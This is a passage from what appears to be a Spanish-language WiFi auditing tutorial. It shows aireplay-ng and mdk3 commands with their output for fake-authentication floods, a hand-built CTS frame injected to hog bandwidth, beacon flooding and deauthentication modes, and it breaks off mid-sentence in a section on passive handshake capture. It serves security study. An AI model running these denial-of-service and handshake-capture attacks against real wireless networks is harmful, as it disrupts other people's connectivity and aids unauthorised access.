&lt;p&gt;Puede sonar raro, pero también existe un ataque llamado ataque de autenticación o asociación. A través de este
ataque, en vez de expulsar a clientes de una red, lo que hacemos es añadirlos.&lt;/p&gt;

&lt;p&gt;Te preguntarás, ¿y qué consigo con eso?, buena pregunta. Nuestro objetivo como atacantes es hacer siempre que
de una u otra forma, los clientes de una red sean reasociados para capturar un Handshake.&lt;/p&gt;

&lt;p&gt;¿Qué crees que pasaría si en una red inyectamos 5.000 clientes?, exacto, por ahí van los tiros. Si una red
dispone de tantos clientes asociados, el router se vuelve loco… incluso hasta notaríamos de hacerlo en local
que la red comenzaría a ir lenta, llegando al punto en el que seríamos expulsados de esta hasta detener el
ataque.&lt;/p&gt;

&lt;p&gt;Inyectar a un cliente es bastante sencillo, lo hacemos a través del parámetro ‘&lt;strong&gt;-1&lt;/strong&gt;’ de aireplay:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo; aireplay-ng --help | tail -n 13 | grep &quot;\-1&quot; | sed '/^\s*$/d' | sed 's/^ *//'; echo&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;--fakeauth&lt;/span&gt;    delay : fake authentication with AP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Imaginemos que tenemos este escenario:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH  6 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 30 s &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  &lt;span class=&quot;nt&quot;&gt;-52&lt;/span&gt;  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not associated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   AC:D1:B8:17:91:C0  &lt;span class=&quot;nt&quot;&gt;-69&lt;/span&gt;    0 - 1      0        5                                                                                                                     
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not associated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   E0:B9:BA:AE:90:FB  &lt;span class=&quot;nt&quot;&gt;-88&lt;/span&gt;    0 - 1      0        1                                
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Veamos cómo podríamos por ejemplo llevar a cabo una falsa autenticación haciendo uso de nuestra tarjeta de red
como estación:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon&lt;/span&gt;
21:20:28  Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;beacon frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESSID: MOVISTAR_1677&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on channel 6
Found BSSID &lt;span class=&quot;s2&quot;&gt;&quot;1C:B0:44:D4:16:78&quot;&lt;/span&gt; to given ESSID &lt;span class=&quot;s2&quot;&gt;&quot;MOVISTAR_1677&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

21:20:28  Sending Authentication Request &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Open System&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ACK]
21:20:28  Authentication successful
21:20:28  Sending Association Request

21:20:33  Sending Authentication Request &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Open System&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ACK]
21:20:33  Authentication successful
21:20:33  Sending Association Request

21:20:38  Sending Authentication Request &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Open System&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ACK]
21:20:38  Authentication successful
21:20:38  Sending Association Request &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ACK]
21:20:38  Association successful :-&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AID: 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con el parámetro ‘&lt;strong&gt;-h&lt;/strong&gt;’, especificamos la dirección MAC del falso cliente a autenticar. Si volvemos a
analizar ahora la red inalámbrica, podremos ver que nuestra tarjeta de red figura como cliente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH  6 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 30 s &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  &lt;span class=&quot;nt&quot;&gt;-52&lt;/span&gt;  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not associated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   AC:D1:B8:17:91:C0  &lt;span class=&quot;nt&quot;&gt;-69&lt;/span&gt;    0 - 1      0        5                                                                                                                     
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not associated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   E0:B9:BA:AE:90:FB  &lt;span class=&quot;nt&quot;&gt;-88&lt;/span&gt;    0 - 1      0        1                                                                                                                     
 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda
gracia, estaríamos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es engañar al router,
haciéndole creer que dispone de ese cliente asociado.&lt;/p&gt;

&lt;p&gt;A efectos prácticos, por el momento esto no genera ningún inconveniente, ¿cómo autenticamos por tanto ahora a
5.000 clientes?. Podríamos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC
aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, &lt;strong&gt;mdk3&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;A través de la utilidad &lt;strong&gt;mdk3&lt;/strong&gt;, tenemos un modo de ataque ‘&lt;strong&gt;Authentication DoS Mode&lt;/strong&gt;’ que se encarga de
asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mdk3 wlan0mon a -a bssidAP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Veámoslo en la práctica, aplicamos el comando por un lado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Dirección MAC del AP hacklab&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH 12 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 1 min &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-08 21:27                                         
                                                                                         
 BSSID              PWR RXQ  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                         
 20:34:FB:B1:C5:53  &lt;span class=&quot;nt&quot;&gt;-27&lt;/span&gt; 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    
                                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
                                                                                         
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not associated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   AC:D1:B8:17:91:C0  &lt;span class=&quot;nt&quot;&gt;-73&lt;/span&gt;    0 - 1     12       25                       
 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  &lt;span class=&quot;nt&quot;&gt;-30&lt;/span&gt;    1e- 6e     0      223                       
 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera
casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a
los clientes más lejanos o con poca señal WiFi.&lt;/p&gt;

&lt;h4 id=&quot;cts-frame-attack&quot;&gt;CTS Frame Attack&lt;/h4&gt;

&lt;p&gt;Un ataque bastante interesante, que incluso puede llegar a dejar inoperativa una red inalámbrica durante un
largo período de tiempo, aunque paremos el ataque.&lt;/p&gt;

&lt;p&gt;Lo que haremos será abrir &lt;strong&gt;Wireshark&lt;/strong&gt; por un lado, capturando paquetes de tipo &lt;strong&gt;CTS&lt;/strong&gt; (Clear-To-Send):&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6gT.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recomiendo investigar sobre este tipo de paquetes junto al &lt;strong&gt;RTS&lt;/strong&gt;, tienen una historia muy bonita frente al
problema del &lt;strong&gt;nodo oculto&lt;/strong&gt;, evitando las famosas colisiones de trama.&lt;/p&gt;

&lt;p&gt;Un paquete &lt;strong&gt;CTS&lt;/strong&gt; dispone generalmente de 4 campos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Frame Control&lt;/li&gt;
  &lt;li&gt;Duración&lt;/li&gt;
  &lt;li&gt;RA (Dirección del Receptor)&lt;/li&gt;
  &lt;li&gt;FCS&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El campo del tiempo para dicho paquete puede ser visto rápidamente desde Wireshark (&lt;strong&gt;304 microsegundos&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6h5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que haremos una vez dispongamos de un paquete &lt;strong&gt;CTS&lt;/strong&gt;, será exportar dicho paquete en un formato
‘&lt;strong&gt;Wireshark/tcpdump/… -pcap&lt;/strong&gt;’:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hf.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si analizamos la captura, veremos que los datos contemplados siguen siendo los mismos:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hp.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez llegados a este punto, en mi caso haré uso de la herramienta ‘&lt;strong&gt;ghex&lt;/strong&gt;’ para abrir la captura con un
editor hexadecimal:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hu.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En esta parte es importante hacer la siguiente distinción:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Los últimos 4 valores: 11 D1 13 85 corresponden al FCS, deberán ser computados por cada variación que
hagamos sobre el resto de valores. Sin embargo, no nos preocupemos por ello… ya que nos lo dará el propio
Wireshark :)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Los 6 valores anteriores al FCS: &lt;strong&gt;30 45 96 BF 9D 2C&lt;/strong&gt;, corresponden a la dirección MAC del router. Obviamente, este valor deberá de ser cambiado al deseado.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Los 2 valores anteriores al FCS: &lt;strong&gt;30 01&lt;/strong&gt;, corresponden al tiempo en microsegundos puesto en hexadecimal y
&lt;strong&gt;Little Endian&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para el último punto, por si han habido confusiones:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hA.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahí vemos que corresponden a los 304 microsegundos. Ahora bien, aquí es donde viene el vector de ataque, vamos
a ver cuál sería el valor en hexadecimal del valor tope permitido (&lt;strong&gt;30.000 microsegundos&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hE.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tratemos desde &lt;strong&gt;ghex&lt;/strong&gt; de sustituir el valor de los 304 microsegundos a 30.000 microsegundos, poniendo su
representación en hexadecimal y Little Endian:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hP.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CONSIDERACIÓN&lt;/strong&gt;: También he especificado la dirección MAC del AP objetivo en &lt;strong&gt;ghex&lt;/strong&gt; (&lt;strong&gt;64:D1:54:88:BA:3C&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;Podríamos pensar que es así de simple, pero no. Recordemos que para cada cambio realizado, hay que computar el
valor del &lt;strong&gt;FCS&lt;/strong&gt;, pues de lo contrario el paquete es inválido. Uno puede optar por comerse la cabeza y tratar
de hacerlo manualmente, pero otra forma es guardando y abriendo esa propia captura desde &lt;strong&gt;Wireshark&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6ia.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos, es una maravilla, dado que ya el propio &lt;strong&gt;Wireshark&lt;/strong&gt; nos da el valor del &lt;strong&gt;FCS&lt;/strong&gt; que necesitamos
para la captura manipulada.&lt;/p&gt;

&lt;p&gt;Por tanto, le hacemos caso y lo cambiamos (Recordemos el Little Endian, también se aplica para este caso):&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6in.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez llegados a este punto, guardamos la captura y probamos a abrirla nuevamente desde Wireshark:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6iy.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto son buenas noticias, pues no nos sale ningún tipo de error, ¡hemos construido un paquete válido!.&lt;/p&gt;

&lt;p&gt;Ahora es cuando viene la parte divertida, inyectemos dicho paquete a nivel de red:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6iJ.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos, se han tramitado un total de 10.000 paquetes de tipo &lt;strong&gt;CTS&lt;/strong&gt; con un tiempo total de 30.000
microsegundos para cada uno. Encima le hemos añadido el parámetro ‘&lt;strong&gt;–topspeed&lt;/strong&gt;’ para evitar que el
siguiente paquete se envié una vez el anterior se ha terminado de enviar, haciendo que todos queden en cola.&lt;/p&gt;

&lt;p&gt;Por aquí podemos ver los valores de cada uno de estos paquetes enviados:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6iP.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;¿Resultado?, lo que se conoce como un secuestro del ancho de banda, haciendo que la red quede completamente
inoperativa durante un largo período de tiempo. No recomiendo hacer el ataque en nuestra propia red.&lt;/p&gt;

&lt;h4 id=&quot;beacon-flood-mode-attack&quot;&gt;Beacon Flood Mode Attack&lt;/h4&gt;

&lt;p&gt;Un &lt;strong&gt;beacon&lt;/strong&gt; es un paquete que contiene información sobre el punto de acceso, como por ejemplo, en qué canal
se encuentra, qué tipo de cifrado lleva, cómo se llama la red, etc.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==0x8&quot; 2&amp;gt;/dev/null&lt;/span&gt;
    1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1585, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_1677
    2 0.307210202 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1588, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_1677
    3 0.614413670 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1591, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_1677
    4 0.921614210 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1594, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_1677
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La peculiaridad de los beacons es que estos se transmiten en claro, ya que las tarjetas de red y otros
dispositivos necesitan poder recoger este tipo de paquetes y extraer la información necesaria para conectarse.&lt;/p&gt;

&lt;p&gt;A través de la herramienta &lt;strong&gt;mdk3&lt;/strong&gt;, podemos generar un ataque conocido como &lt;strong&gt;Beacon Flood Attack&lt;/strong&gt;,
generando montón de paquetes Beacon con información falsa. ¿Qué conseguimos con esto?, pues bueno, uno de los
ataques clásicos consistiría en generar montones de puntos de acceso situados en el mismo canal que un punto
de acceso objetivo, logrando así dañar el espectro de onda de la red dejándola no operativa e invisible por los
usuarios.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ &lt;span class=&quot;c&quot;&gt;#for i in $(seq 1 10); do echo &quot;MyNetwork$i&quot; &amp;gt;&amp;gt; redes.txt; done&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat redes.txt &lt;/span&gt;
MyNetwork1
MyNetwork2
MyNetwork3
MyNetwork4
MyNetwork5
MyNetwork6
MyNetwork7
MyNetwork8
MyNetwork9
MyNetwork10
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ &lt;span class=&quot;c&quot;&gt;#mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este caso, estaríamos generando un buen puñado de puntos de acceso con los &lt;strong&gt;ESSID&lt;/strong&gt; listados en el
archivo, todos ellos posicionados en el canal 7. Para los curiosos, el parámetro ‘&lt;strong&gt;-a&lt;/strong&gt;’ lo que se encarga es
de anunciar redes WPA2, y el parámetro ‘&lt;strong&gt;-s&lt;/strong&gt;’ establece la velocidad de los paquetes emitidos por segundo,
que por defecto están establecidos a 50.&lt;/p&gt;

&lt;p&gt;Por si queréis ver cómo se vería todo desde un dispositivo tercero que trata de escanear o listar los puntos
de acceso disponibles en el entorno:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6s8.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De hecho, hasta si queréis causar curiosidad en el ambiente, si corréis este modo de ataque con &lt;strong&gt;mdk3&lt;/strong&gt; sin
especificar parámetros:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mdk3 wlan0mon b&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Estaríamos generando puntos de acceso con &lt;strong&gt;ESSID’s&lt;/strong&gt; aleatorios:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6sd.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;disassociation-amok-mode-attack&quot;&gt;Disassociation Amok Mode Attack&lt;/h4&gt;

&lt;p&gt;Realmente esto no deja de parecerse a un ataque de de-autenticación dirigido, pero por cultura, &lt;strong&gt;mdk3&lt;/strong&gt;
cuenta con unos modos de operación de tipo &lt;strong&gt;Black List/White List&lt;/strong&gt;, desde los cuales podemos especificar qué
clientes queremos que no sean deautenticados del AP, añadiendo a los mismos en un White List y viceversa.&lt;/p&gt;

&lt;p&gt;Para construir el ataque, simplemente debemos crear un fichero con las direcciones MAC de los clientes a los
cuales queremos de-autenticar del AP. Posteriormente, corremos &lt;strong&gt;mdk3&lt;/strong&gt; especificando el modo de ataque y el
canal en el que se encuentra la red:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6tU.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;michael-shutdown-exploitation&quot;&gt;Michael Shutdown Exploitation&lt;/h4&gt;

&lt;p&gt;Tal y como dice la propia descripción de la utilidad:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Es decir, podemos llegar a apagar un router a través de este ataque.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ANOTACIÓN:&lt;/strong&gt; En la práctica, no es muy efectivo.&lt;/p&gt;

&lt;p&gt;La sintaxis sería la siguiente:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mdk3 wlan0mon m -t bssidAP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;técnicas-pasivas&quot;&gt;Técnicas Pasivas&lt;/h4&gt;

&lt;p&gt;Todo lo visto hasta el momento, requiere de la intervención por nuestra parte en el lado del atacante.&lt;/p&gt;

&lt;p&gt;Tendríamos un modo de actuar de forma pasiva para obtener el Handshake, y es simplemente armarnos de valor y
tener paciencia.&lt;/p&gt;

&lt;p&gt;Podríamos quedarnos esperando hasta que algunas de las estaciones asociadas disponga de mala
señal, se desconecte y reasocie automáticamente sin nosotros tener que hacer nada. Podríamos quedarnos
